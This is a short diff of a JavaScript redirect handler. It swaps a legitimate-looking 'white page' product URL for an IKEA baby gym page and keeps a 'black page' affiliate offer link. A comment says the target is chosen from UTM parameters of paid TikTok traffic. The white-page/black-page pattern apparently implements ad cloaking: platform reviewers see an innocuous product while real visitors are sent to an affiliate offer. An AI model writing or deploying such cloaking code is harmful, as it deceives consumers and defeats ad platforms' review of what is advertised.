@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://toyscentral.es/products/fisherprice-laugh-learn-baby-toddler-toy-mix-learn-dj-table-musical-activity-center-with-lights-sounds-for-ages-6-months?utm_source=tiktok&utm_medium=paid&utm_id=__CAMPAIGN_ID__&utm_campaign=__CAMPAIGN_NAME__";
+    const whitePageURL = "https://www.ikea.com/at/en/p/gulligast-baby-gym-multicolour-90484258/";
     const blackPageURL = "https://uplevelrewarded.com/aff_c?offer_id=1232&aff_id=45076&source=1stlander";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
